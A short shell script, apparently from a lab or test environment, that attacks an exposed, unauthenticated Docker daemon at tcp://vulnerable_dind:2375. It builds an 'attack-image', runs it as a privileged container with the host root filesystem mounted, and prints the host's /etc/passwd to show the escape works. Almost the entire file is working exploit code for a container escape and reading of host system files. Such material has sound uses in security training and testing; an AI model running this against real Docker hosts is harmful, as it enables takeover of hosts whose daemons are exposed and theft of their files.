#!/bin/sh
# Export DOCKER_HOST explicitly so all docker commands target the vulnerable daemon
export DOCKER_HOST=tcp://vulnerable_dind:2375

# Wait until the vulnerable Docker daemon is ready (healthcheck already ensures it, but keep a fallback)
while ! docker info >/dev/null 2>&1; do
  echo "Waiting for vulnerable Docker daemon to become ready..."
  sleep 1
done

# Pull a minimal image for the attacker container
docker pull alpine:3.12

# Build the attack image using an inline Dockerfile, providing the current directory as the build context
docker build -t attack-image -f - . <<'EOF'
FROM alpine:3.12
RUN mkdir /hostfs
EOF

# Run the attack container, mounting the host root as readâ€‘only and printing /etc/passwd
docker run --rm --privileged -v /:/hostfs:ro attack-image sh -c "cat /hostfs/etc/passwd"

# If the exploit succeeds, the host's /etc/passwd will be printed.
